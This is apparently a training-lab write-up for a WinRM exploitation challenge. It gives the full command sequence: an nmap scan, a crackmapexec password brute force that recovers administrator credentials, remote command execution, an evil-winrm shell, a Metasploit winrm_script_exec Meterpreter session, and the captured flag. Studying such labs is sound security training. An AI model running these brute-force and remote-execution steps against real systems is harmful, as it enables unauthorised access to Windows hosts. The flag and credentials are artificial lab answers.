# 🔬WinRM

## Lab 1 <a href="#lab-1" id="lab-1"></a>

> 🔬 [WinRM: Exploitation with Metasploit](https://attackdefense.com/challengedetails?cid=2026)
>
> * Target IP: `10.0.21.86`
> * **WinRM** exploitation
> * Dictionaries to use:
>   * `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
>   * `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

### Enumeration

```bash
nmap -sV -p 5985-5986 10.0.21.86
```

```bash
Starting Nmap 7.70 ( https://nmap.org ) at 2024-07-04 21:08 IST
Nmap scan report for 10.0.21.86
Host is up (0.0030s latency).

PORT     STATE  SERVICE VERSION
5985/tcp open   http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5986/tcp closed wsmans
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.47 seconds
```

> Both WinRM port open

### CrackMapExec Brute-force <a href="#crackmapexec-brute-force" id="crackmapexec-brute-force"></a>

* Use [`crackmapexec`](https://www.kali.org/tools/crackmapexec/) tool to confirm WinRM is running on port `5985`
* Make sure to insert target protocol and target IP to perform the brute force

```bash
crackmapexec winrm 10.0.21.86 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
```

<figure><img src="../../../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

> Credentials obtained `administrator:tinkerbell`

* Execute specific Windows commands

```bash
crackmapexec winrm 10.0.21.86 -u administrator -p tinkerbell -x "whoami"
crackmapexec winrm 10.0.21.86 -u administrator -p tinkerbell -x "systeminfo"
```

<figure><img src="../../../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

### evil-WinRM Shell <a href="#evil-winrm-shell" id="evil-winrm-shell"></a>

* Get a command shell session using `evil-winrm` tool

```bash
evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.0.21.86
```

<figure><img src="../../../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

### Meterpreter Session <a href="#meterpreter-session" id="meterpreter-session"></a>

```bash
msfconsole
msf5 > search winrm
```

<figure><img src="../../../../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

```bash
msf5 > use exploit/windows/winrm/winrm_script_exec 
msf5 exploit(windows/winrm/winrm_script_exec) > set RHOSTS 10.0.21.86
msf5 exploit(windows/winrm/winrm_script_exec) > set FORCE_VBS true
msf5 exploit(windows/winrm/winrm_script_exec) > set PASSWORD tinkerbell
msf5 exploit(windows/winrm/winrm_script_exec) > set USERNAME administrator
msf5 exploit(windows/winrm/winrm_script_exec) > exploit
```

<figure><img src="../../../../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

* Execute specific Windows commands to get flag

<figure><img src="../../../../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>Flag</summary>

`3c716f95616eec677a7078f92657a230`

</details>





